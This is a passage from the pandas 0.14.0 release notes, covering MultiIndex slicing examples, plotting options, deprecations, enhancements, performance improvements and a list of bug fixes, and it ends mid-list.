cases where the passed indexer could be mis-interpreted\n   as indexing *both* axes, rather than into say the MultiIndex for the rows.\n\n   You should do this:\n\n  .. code-block:: python\n\n     >>> df.loc[(slice('A1', 'A3'), ...), :]   noqa: E901\n\n   rather than this:\n\n  .. code-block:: python\n\n     >>> df.loc[(slice('A1', 'A3'), ...)]   noqa: E901\n\n.. warning::\n\n   You will need to make sure that the selection axes are fully lexsorted!\n\n.. ipython:: python\n\n   def mklbl(prefix, n):\n       return [\"%s%s\" % (prefix, i) for i in range(n)]\n\n   index = pd.MultiIndex.from_product([mklbl('A', 4),\n                                       mklbl('B', 2),\n                                       mklbl('C', 4),\n                                       mklbl('D', 2)])\n   columns = pd.MultiIndex.from_tuples([('a', 'foo'), ('a', 'bar'),\n                                        ('b', 'foo'), ('b', 'bah')],\n                                       names=['lvl0', 'lvl1'])\n   df = pd.DataFrame(np.arange(len(index) * len(columns)).reshape((len(index),\n                     len(columns))),\n                     index=index,\n                     columns=columns).sort_index().sort_index(axis=1)\n   df\n\nBasic MultiIndex slicing using slices, lists, and labels.\n\n.. ipython:: python\n\n   df.loc[(slice('A1', 'A3'), slice(None), ['C1', 'C3']), :]\n\nYou can use a ``pd.IndexSlice`` to shortcut the creation of these slices\n\n.. ipython:: python\n\n   idx = pd.IndexSlice\n   df.loc[idx[:, :, ['C1', 'C3']], idx[:, 'foo']]\n\nIt is possible to perform quite complicated selections using this method on multiple\naxes at the same time.\n\n.. ipython:: python\n\n   df.loc['A1', (slice(None), 'foo')]\n   df.loc[idx[:, :, ['C1', 'C3']], idx[:, 'foo']]\n\nUsing a boolean indexer you can provide selection related to the *values*.\n\n.. ipython:: python\n\n   mask = df[('a', 'foo')] > 200\n   df.loc[idx[mask, :, ['C1', 'C3']], idx[:, 'foo']]\n\nYou can also specify the ``axis`` argument to ``.loc`` to interpret the passed\nslicers on a single axis.\n\n.. ipython:: python\n\n   df.loc(axis=0)[:, :, ['C1', 'C3']]\n\nFurthermore you can *set* the values using these methods\n\n.. ipython:: python\n\n   df2 = df.copy()\n   df2.loc(axis=0)[:, :, ['C1', 'C3']] = -10\n   df2\n\nYou can use a right-hand-side of an alignable object as well.\n\n.. ipython:: python\n\n   df2 = df.copy()\n   df2.loc[idx[:, :, ['C1', 'C3']], :] = df2 * 1000\n   df2\n\n.. _whatsnew_0140.plotting:\n\nPlotting\n~~~~~~~~\n\n- Hexagonal bin plots from ``DataFrame.plot`` with ``kind='hexbin'`` (:issue:`5478`), See :ref:`the docs<visualization.hexbin>`.\n- ``DataFrame.plot`` and ``Series.plot`` now supports area plot with specifying ``kind='area'`` (:issue:`6656`), See :ref:`the docs<visualization.area_plot>`\n- Pie plots from ``Series.plot`` and ``DataFrame.plot`` with ``kind='pie'`` (:issue:`6976`), See :ref:`the docs<visualization.pie>`.\n- Plotting with Error Bars is now supported in the ``.plot`` method of ``DataFrame`` and ``Series`` objects (:issue:`3796`, :issue:`6834`), See :ref:`the docs<visualization.errorbars>`.\n- ``DataFrame.plot`` and ``Series.plot`` now support a ``table`` keyword for plotting ``matplotlib.Table``, See :ref:`the docs<visualization.table>`. The ``table`` keyword can receive the following values.\n\n  - ``False``: Do nothing (default).\n  - ``True``: Draw a table using the ``DataFrame`` or ``Series`` called ``plot`` method. Data will be transposed to meet matplotlib's default layout.\n  - ``DataFrame`` or ``Series``: Draw matplotlib.table using the passed data. The data will be drawn as displayed in print method (not transposed automatically).\n    Also, helper function ``pandas.tools.plotting.table`` is added to create a table from ``DataFrame`` and ``Series``, and add it to an ``matplotlib.Axes``.\n\n- ``plot(legend='reverse')`` will now reverse the order of legend labels for\n  most plot kinds. (:issue:`6014`)\n- Line plot and area plot can be stacked by ``stacked=True`` (:issue:`6656`)\n\n- Following keywords are now acceptable for :meth:`DataFrame.plot` with ``kind='bar'`` and ``kind='barh'``:\n\n  - ``width``: Specify the bar width. In previous versions, static value 0.5 was passed to matplotlib and it cannot be overwritten. (:issue:`6604`)\n  - ``align``: Specify the bar alignment. Default is ``center`` (different from matplotlib). In previous versions, pandas passes ``align='edge'`` to matplotlib and adjust the location to ``center`` by itself, and it results ``align`` keyword is not applied as expected. (:issue:`4525`)\n  - ``position``: Specify relative alignments for bar plot layout. From 0 (left/bottom-end) to 1(right/top-end). Default is 0.5 (center). (:issue:`6604`)\n\n  Because of the default ``align`` value changes, coordinates of bar plots are now located on integer values (0.0, 1.0, 2.0 ...). This is intended to make bar plot be located on the same coordinates as line plot. However, bar plot may differs unexpectedly when you manually adjust the bar location or drawing area, such as using ``set_xlim``, ``set_ylim``, etc. In this cases, please modify your script to meet with new coordinates.\n\n- The :func:`parallel_coordinates` function now takes argument ``color``\n  instead of ``colors``. A ``FutureWarning`` is raised to alert that\n  the old ``colors`` argument will not be supported in a future release. (:issue:`6956`)\n\n- The :func:`parallel_coordinates` and :func:`andrews_curves` functions now take\n  positional argument ``frame`` instead of ``data``. A ``FutureWarning`` is\n  raised if the old ``data`` argument is used by name. (:issue:`6956`)\n\n- :meth:`DataFrame.boxplot` now supports ``layout`` keyword (:issue:`6769`)\n- :meth:`DataFrame.boxplot` has a new keyword argument, ``return_type``. It accepts ``'dict'``,\n  ``'axes'``, or ``'both'``, in which case a namedtuple with the matplotlib\n  axes and a dict of matplotlib Lines is returned.\n\n\n.. _whatsnew_0140.prior_deprecations:\n\nPrior version deprecations/changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThere are prior version deprecations that are taking effect as of 0.14.0.\n\n- Remove :class:`DateRange` in favor of :class:`DatetimeIndex` (:issue:`6816`)\n- Remove ``column`` keyword from ``DataFrame.sort`` (:issue:`4370`)\n- Remove ``precision`` keyword from :func:`set_eng_float_format` (:issue:`395`)\n- Remove ``force_unicode`` keyword from :meth:`DataFrame.to_string`,\n  :meth:`DataFrame.to_latex`, and :meth:`DataFrame.to_html`; these function\n  encode in unicode by default (:issue:`2224`, :issue:`2225`)\n- Remove ``nanRep`` keyword from :meth:`DataFrame.to_csv` and\n  :meth:`DataFrame.to_string` (:issue:`275`)\n- Remove ``unique`` keyword from :meth:`HDFStore.select_column` (:issue:`3256`)\n- Remove ``inferTimeRule`` keyword from :func:`Timestamp.offset` (:issue:`391`)\n- Remove ``name`` keyword from :func:`get_data_yahoo` and\n  :func:`get_data_google` ( `commit b921d1a <https://github.com/pandas-dev/pandas/commit/b921d1a2>`__ )\n- Remove ``offset`` keyword from :class:`DatetimeIndex` constructor\n  ( `commit 3136390 <https://github.com/pandas-dev/pandas/commit/3136390>`__ )\n- Remove ``time_rule`` from several rolling-moment statistical functions, such\n  as :func:`rolling_sum` (:issue:`1042`)\n- Removed neg ``-`` boolean operations on numpy arrays in favor of inv ``~``, as this is going to\n  be deprecated in numpy 1.9 (:issue:`6960`)\n\n.. _whatsnew_0140.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- The :func:`pivot_table`/:meth:`DataFrame.pivot_table` and :func:`crosstab` functions\n  now take arguments ``index`` and ``columns`` instead of ``rows`` and ``cols``.  A\n  ``FutureWarning`` is raised to alert that the old ``rows`` and ``cols`` arguments\n  will not be supported in a future release (:issue:`5505`)\n\n- The :meth:`DataFrame.drop_duplicates` and :meth:`DataFrame.duplicated` methods\n  now take argument ``subset`` instead of ``cols`` to better align with\n  :meth:`DataFrame.dropna`.  A ``FutureWarning`` is raised to alert that the old\n  ``cols`` arguments will not be supported in a future release (:issue:`6680`)\n\n- The :meth:`DataFrame.to_csv` and :meth:`DataFrame.to_excel` functions\n  now takes argument ``columns`` instead of ``cols``.  A\n  ``FutureWarning`` is raised to alert that the old ``cols`` arguments\n  will not be supported in a future release (:issue:`6645`)\n\n- Indexers will warn ``FutureWarning`` when used with a scalar indexer and\n  a non-floating point Index (:issue:`4892`, :issue:`6960`)\n\n  .. code-block:: ipython\n\n      non-floating point indexes can only be indexed by integers / labels\n     In [1]: pd.Series(1, np.arange(5))[3.0]\n             pandas/core/index.py:469: FutureWarning: scalar indexers for index type Int64Index should be integers and not floating point\n     Out[1]: 1\n\n     In [2]: pd.Series(1, np.arange(5)).iloc[3.0]\n             pandas/core/index.py:469: FutureWarning: scalar indexers for index type Int64Index should be integers and not floating point\n     Out[2]: 1\n\n     In [3]: pd.Series(1, np.arange(5)).iloc[3.0:4]\n             pandas/core/index.py:527: FutureWarning: slice indexers when using iloc should be integers and not floating point\n     Out[3]:\n             3    1\n             dtype: int64\n\n      these are Float64Indexes, so integer or floating point is acceptable\n     In [4]: pd.Series(1, np.arange(5.))[3]\n     Out[4]: 1\n\n     In [5]: pd.Series(1, np.arange(5.))[3.0]\n     Out[6]: 1\n\n- Numpy 1.9 compat w.r.t. deprecation warnings (:issue:`6960`)\n\n- :meth:`Panel.shift` now has a function signature that matches :meth:`DataFrame.shift`.\n  The old positional argument ``lags`` has been changed to a keyword argument\n  ``periods`` with a default value of 1. A ``FutureWarning`` is raised if the\n  old argument ``lags`` is used by name. (:issue:`6910`)\n- The ``order`` keyword argument of :func:`factorize` will be removed. (:issue:`6926`).\n\n- Remove the ``copy`` keyword from :meth:`DataFrame.xs`, :meth:`Panel.major_xs`, :meth:`Panel.minor_xs`. A view will be\n  returned if possible, otherwise a copy will be made. Previously the user could think that ``copy=False`` would\n  ALWAYS return a view. (:issue:`6894`)\n\n- The :func:`parallel_coordinates` function now takes argument ``color``\n  instead of ``colors``. A ``FutureWarning`` is raised to alert that\n  the old ``colors`` argument will not be supported in a future release. (:issue:`6956`)\n\n- The :func:`parallel_coordinates` and :func:`andrews_curves` functions now take\n  positional argument ``frame`` instead of ``data``. A ``FutureWarning`` is\n  raised if the old ``data`` argument is used by name. (:issue:`6956`)\n\n- The support for the 'mysql' flavor when using DBAPI connection objects has been deprecated.\n  MySQL will be further supported with SQLAlchemy engines (:issue:`6900`).\n\n- The following ``io.sql`` functions have been deprecated: ``tquery``, ``uquery``, ``read_frame``, ``frame_query``, ``write_frame``.\n\n- The ``percentile_width`` keyword argument in :meth:`~DataFrame.describe` has been deprecated.\n  Use the ``percentiles`` keyword instead, which takes a list of percentiles to display. The\n  default output is unchanged.\n\n- The default return type of :func:`boxplot` will change from a dict to a matplotlib Axes\n  in a future release. You can use the future behavior now by passing ``return_type='axes'``\n  to boxplot.\n\n.. _whatsnew_0140.knownissues:\n\nKnown issues\n~~~~~~~~~~~~\n\n- OpenPyXL 2.0.0 breaks backwards compatibility (:issue:`7169`)\n\n\n.. _whatsnew_0140.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n- DataFrame and Series will create a MultiIndex object if passed a tuples dict, See :ref:`the docs<basics.dataframe.from_dict_of_tuples>` (:issue:`3323`)\n\n  .. ipython:: python\n\n     pd.Series({('a', 'b'): 1, ('a', 'a'): 0,\n                ('a', 'c'): 2, ('b', 'a'): 3, ('b', 'b'): 4})\n     pd.DataFrame({('a', 'b'): {('A', 'B'): 1, ('A', 'C'): 2},\n                  ('a', 'a'): {('A', 'C'): 3, ('A', 'B'): 4},\n                  ('a', 'c'): {('A', 'B'): 5, ('A', 'C'): 6},\n                  ('b', 'a'): {('A', 'C'): 7, ('A', 'B'): 8},\n                  ('b', 'b'): {('A', 'D'): 9, ('A', 'B'): 10}})\n\n- Added the ``sym_diff`` method to ``Index`` (:issue:`5543`)\n- ``DataFrame.to_latex`` now takes a longtable keyword, which if True will return a table in a longtable environment. (:issue:`6617`)\n- Add option to turn off escaping in ``DataFrame.to_latex`` (:issue:`6472`)\n- ``pd.read_clipboard`` will, if the keyword ``sep`` is unspecified, try to detect data copied from a spreadsheet\n  and parse accordingly. (:issue:`6223`)\n- Joining a singly-indexed DataFrame with a MultiIndexed DataFrame (:issue:`3662`)\n\n  See :ref:`the docs<merging.join_on_mi>`. Joining MultiIndex DataFrames on both the left and right is not yet supported ATM.\n\n  .. ipython:: python\n\n     household = pd.DataFrame({'household_id': [1, 2, 3],\n                               'male': [0, 1, 0],\n                               'wealth': [196087.3, 316478.7, 294750]\n                               },\n                              columns=['household_id', 'male', 'wealth']\n                              ).set_index('household_id')\n     household\n     portfolio = pd.DataFrame({'household_id': [1, 2, 2, 3, 3, 3, 4],\n                               'asset_id': [\"nl0000301109\",\n                                            \"nl0000289783\",\n                                            \"gb00b03mlx29\",\n                                            \"gb00b03mlx29\",\n                                            \"lu0197800237\",\n                                            \"nl0000289965\",\n                                            np.nan],\n                               'name': [\"ABN Amro\",\n                                        \"Robeco\",\n                                        \"Royal Dutch Shell\",\n                                        \"Royal Dutch Shell\",\n                                        \"AAB Eastern Europe Equity Fund\",\n                                        \"Postbank BioTech Fonds\",\n                                        np.nan],\n                               'share': [1.0, 0.4, 0.6, 0.15, 0.6, 0.25, 1.0]\n                               },\n                              columns=['household_id', 'asset_id', 'name', 'share']\n                              ).set_index(['household_id', 'asset_id'])\n     portfolio\n\n     household.join(portfolio, how='inner')\n\n- ``quotechar``, ``doublequote``, and ``escapechar`` can now be specified when\n  using ``DataFrame.to_csv`` (:issue:`5414`, :issue:`4528`)\n- Partially sort by only the specified levels of a MultiIndex with the\n  ``sort_remaining`` boolean kwarg. (:issue:`3984`)\n- Added ``to_julian_date`` to ``TimeStamp`` and ``DatetimeIndex``.  The Julian\n  Date is used primarily in astronomy and represents the number of days from\n  noon, January 1, 4713 BC.  Because nanoseconds are used to define the time\n  in pandas the actual range of dates that you can use is 1678 AD to 2262 AD. (:issue:`4041`)\n- ``DataFrame.to_stata`` will now check data for compatibility with Stata data types\n  and will upcast when needed.  When it is not possible to losslessly upcast, a warning\n  is issued (:issue:`6327`)\n- ``DataFrame.to_stata`` and ``StataWriter`` will accept keyword arguments time_stamp\n  and data_label which allow the time stamp and dataset label to be set when creating a\n  file. (:issue:`6545`)\n- ``pandas.io.gbq`` now handles reading unicode strings properly. (:issue:`5940`)\n- :ref:`Holidays Calendars<timeseries.holiday>` are now available and can be used with the ``CustomBusinessDay`` offset (:issue:`6719`)\n- ``Float64Index`` is now backed by a ``float64`` dtype ndarray instead of an\n  ``object`` dtype array (:issue:`6471`).\n- Implemented ``Panel.pct_change`` (:issue:`6904`)\n- Added ``how`` option to rolling-moment functions to dictate how to handle resampling; :func:`rolling_max` defaults to max,\n  :func:`rolling_min` defaults to min, and all others default to mean (:issue:`6297`)\n- ``CustomBusinessMonthBegin`` and ``CustomBusinessMonthEnd`` are now available (:issue:`6866`)\n- :meth:`Series.quantile` and :meth:`DataFrame.quantile` now accept an array of\n  quantiles.\n- :meth:`~DataFrame.describe` now accepts an array of percentiles to include in the summary statistics (:issue:`4196`)\n- ``pivot_table`` can now accept ``Grouper`` by ``index`` and ``columns`` keywords (:issue:`6913`)\n\n  .. ipython:: python\n\n     import datetime\n     df = pd.DataFrame({\n         'Branch': 'A A A A A B'.split(),\n         'Buyer': 'Carl Mark Carl Carl Joe Joe'.split(),\n         'Quantity': [1, 3, 5, 1, 8, 1],\n         'Date': [datetime.datetime(2013, 11, 1, 13, 0),\n                  datetime.datetime(2013, 9, 1, 13, 5),\n                  datetime.datetime(2013, 10, 1, 20, 0),\n                  datetime.datetime(2013, 10, 2, 10, 0),\n                  datetime.datetime(2013, 11, 1, 20, 0),\n                  datetime.datetime(2013, 10, 2, 10, 0)],\n         'PayDay': [datetime.datetime(2013, 10, 4, 0, 0),\n                    datetime.datetime(2013, 10, 15, 13, 5),\n                    datetime.datetime(2013, 9, 5, 20, 0),\n                    datetime.datetime(2013, 11, 2, 10, 0),\n                    datetime.datetime(2013, 10, 7, 20, 0),\n                    datetime.datetime(2013, 9, 5, 10, 0)]})\n     df\n\n  .. code-block:: ipython\n\n     In [75]: df.pivot_table(values='Quantity',\n        ....:                index=pd.Grouper(freq='M', key='Date'),\n        ....:                columns=pd.Grouper(freq='M', key='PayDay'),\n        ....:                aggfunc=\"sum\")\n     Out[75]:\n     PayDay      2013-09-30  2013-10-31  2013-11-30\n     Date\n     2013-09-30         NaN         3.0         NaN\n     2013-10-31         6.0         NaN         1.0\n     2013-11-30         NaN         9.0         NaN\n\n     [3 rows x 3 columns]\n\n- Arrays of strings can be wrapped to a specified width (``str.wrap``) (:issue:`6999`)\n- Add :meth:`~Series.nsmallest` and :meth:`Series.nlargest` methods to Series, See :ref:`the docs <basics.nsorted>` (:issue:`3960`)\n\n- ``PeriodIndex`` fully supports partial string indexing like ``DatetimeIndex`` (:issue:`7043`)\n\n  .. code-block:: ipython\n\n     In [76]: prng = pd.period_range('2013-01-01 09:00', periods=100, freq='H')\n\n     In [77]: ps = pd.Series(np.random.randn(len(prng)), index=prng)\n\n     In [78]: ps\n     Out[78]:\n     2013-01-01 09:00    0.015696\n     2013-01-01 10:00   -2.242685\n     2013-01-01 11:00    1.150036\n     2013-01-01 12:00    0.991946\n     2013-01-01 13:00    0.953324\n                           ...\n     2013-01-05 08:00    0.285296\n     2013-01-05 09:00    0.484288\n     2013-01-05 10:00    1.363482\n     2013-01-05 11:00   -0.781105\n     2013-01-05 12:00   -0.468018\n     Freq: H, Length: 100, dtype: float64\n\n     In [79]: ps['2013-01-02']\n     Out[79]:\n     2013-01-02 00:00    0.553439\n     2013-01-02 01:00    1.318152\n     2013-01-02 02:00   -0.469305\n     2013-01-02 03:00    0.675554\n     2013-01-02 04:00   -1.817027\n                           ...\n     2013-01-02 19:00    0.036142\n     2013-01-02 20:00   -2.074978\n     2013-01-02 21:00    0.247792\n     2013-01-02 22:00   -0.897157\n     2013-01-02 23:00   -0.136795\n     Freq: H, Length: 24, dtype: float64\n\n- ``read_excel`` can now read milliseconds in Excel dates and times with xlrd >= 0.9.3. (:issue:`5945`)\n- ``pd.stats.moments.rolling_var`` now uses Welford's method for increased numerical stability (:issue:`6817`)\n- pd.expanding_apply and pd.rolling_apply now take args and kwargs that are passed on to\n  the func (:issue:`6289`)\n- ``DataFrame.rank()`` now has a percentage rank option (:issue:`5971`)\n- ``Series.rank()`` now has a percentage rank option (:issue:`5971`)\n- ``Series.rank()`` and ``DataFrame.rank()`` now accept ``method='dense'`` for ranks without gaps (:issue:`6514`)\n- Support passing ``encoding`` with xlwt (:issue:`3710`)\n- Refactor Block classes removing ``Block.items`` attributes to avoid duplication\n  in item handling (:issue:`6745`, :issue:`6988`).\n- Testing statements updated to use specialized asserts (:issue:`6175`)\n\n\n\n.. _whatsnew_0140.performance:\n\nPerformance\n~~~~~~~~~~~\n\n- Performance improvement when converting ``DatetimeIndex`` to floating ordinals\n  using ``DatetimeConverter`` (:issue:`6636`)\n- Performance improvement for  ``DataFrame.shift`` (:issue:`5609`)\n- Performance improvement in indexing into a MultiIndexed Series (:issue:`5567`)\n- Performance improvements in single-dtyped indexing (:issue:`6484`)\n- Improve performance of DataFrame construction with certain offsets, by removing faulty caching\n  (e.g. MonthEnd,BusinessMonthEnd), (:issue:`6479`)\n- Improve performance of ``CustomBusinessDay`` (:issue:`6584`)\n- improve performance of slice indexing on Series with string keys (:issue:`6341`, :issue:`6372`)\n- Performance improvement for ``DataFrame.from_records`` when reading a\n  specified number of rows from an iterable (:issue:`6700`)\n- Performance improvements in timedelta conversions for integer dtypes (:issue:`6754`)\n- Improved performance of compatible pickles (:issue:`6899`)\n- Improve performance in certain reindexing operations by optimizing ``take_2d`` (:issue:`6749`)\n- ``GroupBy.count()`` is now implemented in Cython and is much faster for large\n  numbers of groups (:issue:`7016`).\n\nExperimental\n~~~~~~~~~~~~\n\nThere are no experimental changes in 0.14.0\n\n\n.. _whatsnew_0140.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Bug in Series ValueError when index doesn't match data (:issue:`6532`)\n- Prevent segfault due to MultiIndex not being supported in HDFStore table\n  format (:issue:`1848`)\n- Bug in ``pd.DataFrame.sort_index`` where mergesort wasn't stable when ``ascending=False`` (:issue:`6399`)\n- Bug in ``pd.tseries.frequencies.to_offset`` when argument has leading zeros (:issue:`6391`)\n- Bug in version string gen. for dev versions with shallow clones / install from tarball (:issue:`6127`)\n- Inconsistent tz parsing ``Timestamp`` / ``to_datetime`` for current year (:issue:`5958`)\n- Indexing bugs with reordered indexes (:issue:`6252`, :issue:`6254`)\n- Bug in ``.xs`` with a Series multiindex (:issue:`6258`, :issue:`5684`)\n- Bug in conversion of a string types to a DatetimeIndex with a specified frequency (:issue:`6273`, :issue:`6274`)\n- Bug in ``eval`` where type-promotion failed for large expressions (:issue:`6205`)\n- Bug in interpolate with ``inplace=True`` (:issue:`6281`)\n- ``HDFStore.remove`` now handles start and stop (:issue:`6177`)\n- ``HDFStore.select_as_multiple`` handles start and stop the same way as ``select`` (:issue:`6177`)\n- ``HDFStore.select_as_coordinates`` and ``select_column`` works with a ``where`` clause that results in filters (:issue:`6177`)\n- Regression in join of non_unique_indexes (:issue:`6329`)\n- Issue with groupby ``agg`` with a single function and a mixed-type frame (:issue:`6337`)\n- Bug in ``DataFrame.replace()`` when passing a non- ``bool``\n  ``to_replace`` argument (:issue:`6332`)\n- Raise when trying to align on different levels of a MultiIndex assignment (:issue:`3738`)\n- Bug in setting complex dtypes via boolean indexing (:issue:`6345`)\n- Bug in TimeGrouper/resample when presented with a non-monotonic DatetimeIndex that would return invalid results. (:issue:`4161`)\n- Bug in index name propagation in TimeGrouper/resample (:issue:`4161`)\n- TimeGrouper has a more compatible API to the rest of the groupers (e.g. ``groups`` was missing) (:issue:`3881`)\n- Bug in multiple grouping with a TimeGrouper depending on target column order (:issue:`6764`)\n- Bug in ``pd.eval`` when parsing strings with possible tokens like ``'&'``\n  (:issue:`6351`)\n- Bug correctly handle placements of ``-inf`` in Panels when dividing by integer 0 (:issue:`6178`)\n- ``DataFrame.shift`` with ``axis=1`` was raising (:issue:`6371`)\n- Disabled clipboard tests until release time (run locally with ``nosetests -A disabled``) (:issue:`6048`).\n- Bug in ``DataFrame.replace()`` when passing a nested ``dict`` that contained\n  keys not in the values to be replaced (:issue:`6342`)\n- ``str.match`` ignored the na flag (:issue:`6609`).\n- Bug in take with duplicate columns that were not consolidated (:issue:`6240`)\n- Bug in interpolate changing dtypes (:issue:`6290`)\n- Bug in ``Series.get``, was using a buggy access method (:issue:`6383`)\n- Bug in hdfstore queries of the form ``where=[('date', '>=', datetime(2013,1,1)), ('date', '<=', datetime(2014,1,1))]`` (:issue:`6313`)\n- Bug in ``DataFrame.dropna`` with duplicate indices (:issue:`6355`)\n- Regression in chained getitem indexing with embedded list-like from 0.12 (:issue:`6394`)\n- ``Float64Index`` with nans not comparing correctly (:issue:`6401`)\n- ``eval``/``query`` expressions with strings containing the ```` character\n  will now work (:issue:`6366`).\n- Bug in ``Series.reindex`` when specifying a ``method`` with some nan values was inconsistent (noted on a resample) (:issue:`6418`)\n- Bug in :meth:`DataFrame.replace` where nested dicts were erroneously\n  depending on the order of dictionary keys and values (:issue:`5338`).\n- Performance issue in concatenating with empty objects (:issue:`3259`)\n- Clarify sorting of ``sym_diff`` on ``Index`` objects with ``NaN`` values (:issue:`6444`)\n- Regression in ``MultiIndex.from_product`` with a ``DatetimeIndex`` as input (:issue:`6439`)\n- Bug in ``str.extract`` when passed a non-default index (:issue:`6348`)\n- Bug in ``str.split`` when passed ``pat=None`` and ``n=1`` (:issue:`6466`)\n- Bug in ``io.data.DataReader`` when passed ``\"F-F_Momentum_Factor\"`` and ``data_source=\"famafrench\"`` (:issue:`6460`)\n- Bug in ``sum`` of a ``timedelta64[ns]`` series (:issue:`6462`)\n- Bug in ``resample`` with a timezone and certain offsets (:issue:`6397`)\n- Bug in ``iat/iloc`` with duplicate indices on a Series (:issue:`6493`)\n- Bug in ``read_html`` where nan's were incorrectly being used to indicate\n  missing values in text. Should use the empty string for consistency with the\n  rest of pandas (:issue:`5129`).\n- Bug in ``read_html`` tests where redirected invalid URLs would make one test\n  fail (:issue:`6445`).\n- Bug in multi-axis indexing using ``.loc`` on non-unique indices (:issue:`6504`)\n- Bug that caused _ref_locs corruption when slice indexing across columns axis of a DataFrame (:issue:`6525`)\n- Regression from 0.13 in the treatment of numpy ``datetime64`` non-ns dtypes in Series creation (:issue:`6529`)\n- ``.names`` attribute of MultiIndexes passed to ``set_index`` are now preserved (:issue:`6459`).\n- Bug in setitem with a duplicate index and an alignable rhs (:issue:`6541`)\n- Bug in setitem with ``.loc`` on mixed integer Indexes (:issue:`6546`)\n- Bug in ``pd.read_stata`` which would use the wrong data types and missing values (:issue:`6327`)\n- Bug in ``DataFrame.to_stata`` that lead to data loss in certain cases, and could be exported using the\n  wrong data types and missing values (:issue:`6335`)\n- ``StataWriter`` replaces missing values in string columns by empty string (:issue:`6802`)\n- Inconsistent types in ``Timestamp`` addition/subtraction (:issue:`6543`)\n- Bug in preserving frequency across Timestamp addition/subtraction (:issue:`4547`)\n- Bug in empty list lookup caused ``IndexError`` exceptions (:issue:`6536`, :issue:`6551`)\n- ``Series.quantile`` raising on an ``object`` dtype (:issue:`6555`)\n- Bug in ``.xs`` with a ``nan`` in level when dropped (:issue:`6574`)\n- Bug in fillna with ``method='bfill/ffill'`` and ``datetime64[ns]`` dtype (:issue:`6587`)\n- Bug in sql writing with mixed dtypes possibly leading to data loss (:issue:`6509`)\n- Bug in ``Series.pop`` (:issue:`6600`)\n- Bug in ``iloc`` indexing when positional indexer matched ``Int64Index`` of the corresponding axis and no reordering happened (:issue:`6612`)\n- Bug in ``fillna`` with ``limit`` and ``value`` specified\n- Bug in ``DataFrame.to_stata`` when columns have non-string names (:issue:`4558`)\n- Bug in compat with ``np.compress``, surfaced in (:issue:`6658`)\n- Bug in binary operations with a rhs of a Series not aligning (:issue:`6681`)\n- Bug in ``DataFrame.to_stata`` which incorrectly handles nan values and ignores ``with_index`` keyword argument (:issue:`6685`)\n- Bug in resample with extra bins when using an evenly divisible frequency (:issue:`4076`)\n- Bug in consistency of groupby aggregation when passing a custom function (:issue:`6715`)\n- Bug in resample when ``how=None`` resample freq is the same as the axis frequency (:issue:`5955`)\n- Bug in downcasting inference with empty arrays (:issue:`6733`)\n- Bug in ``obj.blocks`` on sparse containers dropping all but the last items of same for dtype (:issue:`6748`)\n- Bug in unpickling ``NaT (NaTType)`` (:issue:`4606`)\n- Bug in ``DataFrame.replace()`` where regex meta characters were being treated\n  as regex even when ``regex=False`` (:issue:`6777`).\n- Bug in timedelta ops on 32-bit platforms (:issue:`6808`)\n- Bug in setting a tz-aware index directly via ``.index`` (:issue:`6785`)\n- Bug in expressions.py where numexpr would try to evaluate arithmetic ops\n  (:issue:`6762`).\n- Bug in Makefile where it didn't remove Cython generated C files with ``make\n  clean`` (:issue:`6768`)\n- Bug with numpy < 1.7.2 when reading long strings from ``HDFStore`` (:issue:`6166`)\n- Bug in ``DataFrame._reduce`` where non bool-like (0/1) integers were being\n  converted into bools. (:issue:`6806`)\n- Regression from 0.13 with ``fillna`` and a Series on datetime-like (:issue:`6344`)\n- Bug in adding ``np.timedelta64`` to ``DatetimeIndex`` with timezone outputs incorrect results (:issue:`6818`)\n- Bug in ``DataFrame.replace()`` where changing a dtype through replacement\n  would only replace the first occurrence of a value (:issue:`6689`)\n- Better error message when passing a frequency of 'MS' in ``Period`` construction (GH5332)\n- Bug in ``Series.__unicode__`` when ``max_rows=None`` and the Series has more than 1000 rows. (:issue:`6863`)\n- Bug in ``groupby.get_group`` where a datelike wasn't always accepted (:issue:`5267`)\n- Bug in ``groupBy.get_group`` created by ``TimeGrouper`` raises ``AttributeError`` (:issue:`6914`)\n- Bug in ``DatetimeIndex.tz_localize`` and ``DatetimeIndex.tz_convert`` converting ``NaT`` incorrectly (:issue:`5546`)\n- Bug in arithmetic operations affecting ``NaT`` (:issue:`6873`)\n- Bug in ``Series.str.extract`` where the resulting ``Series`` from a single\n  group match wasn't renamed to the group name\n- Bug in ``DataFrame.to_csv`` where setting ``index=False`` ignored the\n  ``header`` kwarg (:issue:`6186`)\n- Bug in ``DataFrame.plot`` and ``Series.plot``, where the legend behave inconsistently when plotting to the same axes repeatedly (:issue:`6678`)\n- Internal tests for patching ``__finalize__`` / bug in merge not finalizing (:issue:`6923`, :issue:`6927`)\n- accept ``TextFileReader`` in ``concat``, which was affecting a common user idiom (:issue:`6583`)\n- Bug in C parser with leading white space (:issue:`3374`)\n- Bug in C parser with ``delim_whitespace=True`` and ``\\r``-delimited lines\n- Bug in python parser with explicit MultiIndex in row following column header (:issue:`6893`)\n- Bug in ``Series.rank`` and ``DataFrame.rank`` that caused small floats (<1e-13) to all receive the same rank (:issue:`6886`)\n- Bug in ``DataFrame.apply`` with functions that used ``*args`` or ``**kwargs`` and returned\n  an empty result (:issue:`6952`)\n- Bug in sum/mean on 32-bit platforms on overflows (:issue:`6915`)\n- Moved ``Panel.shift`` to ``NDFrame.slice_shift`` and fixed to respect multiple dtypes. (:issue:`6959`)\n- Bug in enabling ``subplots=True`` in ``DataFrame.plot`` only has single column raises ``TypeError``, and ``Series.plot`` raises ``AttributeError`` (:issue:`6951`)\n- Bug in ``DataFrame.plot`` draws unnecessary axes when enabling ``subplots`` and ``kind=scatter`` (:issue:`6951`)\n- Bug in ``read_csv`` from a filesystem with non-utf-8 encoding (:issue:`6807`)\n- Bug in ``iloc`` when setting / aligning (:issue:`6766`)\n- Bug causing UnicodeEncodeError when get_dummies called with unicode values and a prefix (:issue:`6885`)\n- Bug in timeseries-with-frequency plot cursor display (:issue:`5453`)\n- Bug surfaced in ``groupby.plot`` when using a ``Float64Index`` (:issue:`7025`)\n- Stopped tests from failing if options data isn't able to be downloaded from Yahoo (:issue:`7034`)\n- Bug in ``parallel_coordinates`` and ``radviz`` where reordering of class column\n  caused possible color/class mismatch (:issue:`6956`)\n- Bug in ``radviz`` and ``andrews_curves`` where multiple values of 'color'\n  were being passed to plotting method (:issue:`6956`)\n- Bug in ``Float64Index.isin()`` where containing ``nan`` s would make indices\n  claim that they contained all the things (:issue:`7066`).\n- Bug in 